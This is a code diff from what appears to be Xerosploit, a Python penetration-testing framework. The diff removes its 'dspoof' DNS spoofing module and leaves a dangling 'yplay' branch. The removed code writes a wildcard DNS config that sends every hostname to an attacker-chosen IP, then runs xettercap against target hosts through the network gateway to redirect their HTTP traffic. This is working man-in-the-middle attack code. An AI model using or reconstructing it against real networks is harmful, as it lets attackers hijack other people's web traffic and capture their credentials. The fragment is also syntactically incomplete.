@@ -109,40 +109,4 @@ print(""" \033[1;36m
 
 						snif()
 
-					elif options == "dspoof":
-						print(""" \033[1;36m
-┌══════════════════════════════════════════════════════════════┐
-█                                                              █
-█                         DNS spoofing                         █
-█                                                              █
-█   Supply false DNS information to all target browsed hosts   █
-█     Redirect all the http traffic to the specified one IP    █
-└══════════════════════════════════════════════════════════════┘     \033[1;m""")
-						def dspoof():
-							print("\033[1;32m\n[+] Enter 'run' to execute the 'dspoof' command.\n\033[1;m")
-							action_dspoof = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
-							if action_dspoof == "back":
-								option()
-							elif action_dspoof == "exit":
-								sys.exit(exit_msg)	
-							elif action_dspoof == "home":
-								home()
-							elif action_dspoof == "run":
-								print("\033[1;32m\n[+] Enter the IP address where you want to redirect the traffic.\n\033[1;m")
-								action_dspoof_ip = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
-								dns_conf = action_dspoof_ip + " .*\.*"
-								outdns = open('/opt/xerosploit/tools/files/dns.conf','w')
-								outdns.write(dns_conf)
-								outdns.close()
-
-								print("\033[1;34m\n[++] Redirecting all the traffic to " + action_dspoof_ip + " ... \033[1;m")
-								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-
-								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /opt/xerosploit/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
-								dspoof()
-							else:
-								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
-								dspoof()
-						dspoof()
-					elif options == "yplay":
 						print(""" \033[1;36m
